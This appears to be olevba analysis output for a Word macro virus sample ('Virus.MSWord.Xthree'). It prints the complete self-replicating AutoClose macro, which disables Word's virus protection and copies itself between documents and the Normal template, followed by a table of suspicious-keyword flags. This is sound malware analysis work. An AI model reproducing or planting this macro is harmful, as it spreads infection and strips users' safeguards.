olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Xthree
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Xthree - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO x.bas 
in file: ./Virus.MSWord.Xthree - OLE stream: 'Macros/VBA/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.SaveNormalPrompt = 0
Options.VirusProtection = 0
Options.ConfirmConversions = 0
z = Int(Rnd * 3)
Set N = NormalTemplate.VBProject.VBComponents
Set D = ActiveDocument.VBProject.VBComponents
If N.Item("x").Name <> "x" Then D("x").export ("C:\" & z & ".xxx")
N.import ("C:\" & z & ".xxx")
Kill ("C:\" & z & ".xxx")
If D.Item("x").Name <> "x" Then N("x").export ("C:\" & z & ".xxx")
D.import ("C:\" & z & ".xxx")
Kill ("C:\" & z & ".xxx")
End Sub

Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

